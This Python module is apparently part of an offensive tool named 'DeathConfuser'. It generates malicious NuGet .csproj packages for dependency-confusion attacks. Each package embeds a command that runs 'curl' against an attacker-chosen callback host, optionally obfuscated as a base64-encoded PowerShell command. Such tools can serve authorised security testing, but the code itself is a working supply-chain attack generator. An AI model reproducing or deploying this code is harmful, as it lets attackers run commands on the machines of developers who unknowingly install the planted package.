"""NuGet payload generator."""
from __future__ import annotations

import base64
from typing import Optional

from payloads.builder import PayloadBuilder

builder = PayloadBuilder()


def _encode(cmd: str, method: Optional[str]) -> str:
    if method == "b64":
        enc = base64.b64encode(cmd.encode()).decode()
        return f"powershell -EncodedCommand {enc}"
    return cmd


def generate(package: str, callback: str, encode: Optional[str] = None) -> str:
    """Return a .csproj payload executing an external command."""

    cmd = _encode(f"curl -m5 {callback}", encode)
    return builder.render(
        "nuget_csproj.xml.j2",
        package_name=package,
        version="0.0.1",
        description="DeathConfuser payload",
        payload_code=cmd,
    )
